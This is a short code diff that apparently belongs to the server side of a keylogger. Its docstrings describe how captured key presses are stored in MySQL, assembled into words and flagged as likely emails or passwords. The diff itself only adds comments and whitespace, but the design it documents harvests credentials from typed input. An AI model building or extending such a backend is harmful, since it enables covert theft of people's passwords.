@@ -20,6 +20,7 @@ class Process:
     #         Key Processing           
     #                                     
     #######################################
+    
     def addKey(self, data):
         payload = json.loads(data)
         self.pushDB_keys(payload)
@@ -70,10 +71,15 @@ class Process:
             
         return 0
         
-    ###################################            
-    #   For email: check if string contains "@"     
-    #   For password: check if string is a mix of alphabet and numbers     
-    ###################################
+  
+    '''
+    This function checks if the string processed is an email or a password
+    
+    For email: check if the string contains "@"
+    For password: check if string is a mix of alphabet and numbers
+    
+    Future iterations, isPassword can be determined using a dictionary attack style comparison
+    '''
     def checkEmailPassword(self):
         check_word = self.payload['processedWord']
         if "@" in check_word:
@@ -120,5 +126,15 @@ class Process:
         }
         
     
+    '''
+    When the data is sent to main.py, it is immediate processed and passed key-by-key into process.py
     
+    Individual key presses have are inserted in a key table in the MySQL database
+    For each key press, it is appended to our temporary word cache, where on a break character (i.e. Return or Space),
+    the cached word is appended to the word payload and this is inserted into the word table in the MySQL database.
+    
+    For each word, additional processing is completed:
+    1. isEmail - checks if the string contains "@"
+    2. isPassword - check if the string is a mixture of numbers and characters
+    '''
     
